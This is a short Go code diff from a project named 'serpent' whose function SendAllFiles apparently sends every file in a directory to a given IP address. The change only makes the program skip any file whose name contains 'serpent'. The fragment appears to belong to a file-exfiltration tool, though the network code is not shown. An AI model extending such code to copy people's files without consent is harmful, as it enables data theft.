@@ -6,6 +6,7 @@ import (
 	"os"
 	"serpent/pkg/encrypt"
 	"serpent/pkg/https"
+	"strings"
 )
 
 func main() {
@@ -51,7 +52,7 @@ func SendAllFiles(ip string) error {
 		if entry.IsDir() {
 			continue // Skip directories
 		}
-		if entry.Name() == "serpent" {
+		if strings.Contains(strings.ToLower(entry.Name()), "serpent") {
 			continue // Skip the serpent executable itself
 		}
 		filePath := entry.Name()
